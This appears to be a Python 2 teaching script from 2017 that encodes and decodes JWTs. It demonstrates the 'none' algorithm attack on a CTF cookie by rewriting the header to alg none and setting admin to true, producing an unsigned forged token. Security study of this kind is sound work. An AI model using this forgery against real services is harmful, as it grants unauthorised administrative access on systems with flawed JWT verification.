'''
JWT encdoer / decoder, primarily aimed at demonstrating the "none" algortithm vulnerability
a badly written JWT implementation would be susceptible to.susceptible

References: RFC 7519 (especially section 6: "Unsecured JWTs")

Author: btx
Date: 2017-05-29
'''

import sys
import base64
import json
import hmac
import hashlib


def base64_url_decode(inp):
    '''
        We use this instead of base64.b64decode because the JWT spec requires the base64 encoding to be URL-safe

        We automatically add the = padding because the JWT spec calls for unpadded base64 strings
    '''

    return (base64.urlsafe_b64decode(inp + '=' * (4 - len(inp) % 4)))


def base64_url_encode(inp):
    '''
        We use this instead of base64.b64encode because the JWT spec requires the base64 encoding to be URL-safe

        We automatically strip off the = padding because the JWT spec calls for unpadded base64 strings
    '''

    return (base64.urlsafe_b64encode(inp).rstrip('='))


def encode_jwt(header_str, payload_str, secret=None):
    '''
        Returns an encoded JSON web token made from the input parameters.  SUpports HS256 and none signature algorithms.
        Input header and payload are checked to make sure they are valid JSON strings, and that the header incldues a
        valid algorithm (in the 'alg' field)

        header_str: Must be a VALID JSON-compliant stirng containing a valid value for alg and optionally the typ: "JWT"
        payload_str: Must be a VALID JSON-compliant string
        secret: If the alg is HS256, must be a string.  If alg is none, is ignored
        returns: None on error, encoded jwt on success
    '''

    try:
        header_dict = json.loads(header_str)
    except:
        print "Invalid JSON for the header_str: %s" % header_str
        return None

    if 'alg' not in header_dict:
        print "Invalid header: alg not specified: %s" % header_str
        return None

    alg = header_dict['alg']

    try:
        payload_dict = json.loads(payload_str)
    except:
        print "Invalid JSON for the payload_str: %s" % payload_str
        return None

    header = base64_url_encode(header_str)
    payload = base64_url_encode(payload_str)
    if alg.lower() == 'hs256':
        signature = base64_url_encode(hmac.new(secret, msg=header + "." + payload, digestmod=hashlib.sha256).digest())
    elif alg.lower() == 'none':
        signature = ''
    else:
        print "Illegal alg specified in header: %s" % alg
        return None

    return '{0}.{1}.{2}'.format(header, payload, signature)


def decode_jwt(cookie):
    '''
        Returns the decoded header, payload and signature.  Verifies that each piece is legally encoded in urlsafe
        base64, and that the header and payload are valid JSON strings.  Also checks to make sure the 'alg' field
        exists in the header.  It DOES NOT validate the signature, nor does it validate the value of the 'alg' field.

        cookie: The JWT string base64 encoded
        returns: None on failure, tuple (header, payload, signature) on success.on

        Note that it returns the header & payload with the exact same spacing/formatting as they had in the input.
        If this function decoded the JSON strings into native types, the formatting and field order could change
        when they were passed back to encode_jwt.
    '''

    jwl = cookie.split('.')

    if len(jwl) != 3:
        print "Not a JWT - cookie must be split by 3 periods."
        return None

    try:
        header = base64_url_decode(jwl[0])
    except:
        print "Header is not a valid base64 string."
        return None

    try:
        header_dict = json.loads(header)
    except:
        print "Header was not valid JSON: %s" % header
        return None

    if 'alg' not in header_dict:
        print "The signature algorithm is not specified in the header JSON: %s" % header_dict
        return None

    try:
        payload = base64_url_decode(jwl[1])
    except:
        print "PAyload is not a valid base64 string."
        return None

    try:
        payload_dict = json.loads(payload)
    except:
        print "Payload was not valid JSON: %s  (%s)" % (payload, sys.exc_info()[0])
        return None

    if len(jwl[2]) == 0:
        signature = ''
    else:
        try:
            signature = base64_url_decode(jwl[2])
        except:
            print "Signature was not a valid base64 string."
            return None

    return (header, payload, signature)

# Testing functions


def test_decode(cookie):
    print "\nTesting decoding:"
    print "Input JWT string: %s" % cookie
    t = decode_jwt(cookie)
    if t is None:
        print "Bad cookie value for JWT."
        return (None, None, None)

    header, payload, signature = t
    print "Header: %s" % header
    print "Payload: %s" % payload
    print "Signature: %s" % repr(signature)
    return (header, payload, signature)


def test_encode(header_str, payload_str, secret=None):
    print "\nTesting encoding:"
    print "Header: %s" % header_str
    print "Payload: %s" % payload_str
    secstr = "" if secret is None else secret
    print "Secret: %s" % secstr
    jwt = encode_jwt(header_str, payload_str, secret)

    if jwt is None:
        "Error while calculating JWT."
    else:
        print "Encoded+Signed (if applicable) JWT: %s" % jwt
    return jwt


if __name__ == '__main__':

    print "\nTest 1"
    print "=" * 80

# Cookie value came from CTF challenge https://gist.github.com/wedge-jarrad/01a175a3e919fc9be7c161b9d2686a1e
    header, payload, signature = test_decode('''eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.MYCzSu-yZYeyvUGq5K-9LJRgp07K8xgV2DbyzlaPdiQ''')

# Demonstrate the "none" attack by setting alg to none in the header, and setting admin to true in the payload.
# Note that JSON implementations can re-order arguments, or put spacing where none was before, changing values
# you might not chagned if converted to/from other types.  This is why I've kept the header and payload as strings,
# rather than JSON decoding them into native dicts.

    header_str = header.replace('"alg":"HS256"', '"alg":"none"')
    payload_str = payload.replace('"admin":false', '"admin":true')
    jwt = test_encode(header_str, payload_str)

    print "\nTest 2"
    print "=" * 80

# A real test from the interwebs where the secret == "secret"

    cookie = '''eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ'''
    header, payload, signature = test_decode(cookie)
    if header is None:
        print "Fail"
        sys.exit(1)

    jwt = test_encode(header, payload, 'secret')

    passstr = "Passed" if (jwt == cookie) else "Failed"
    print passstr
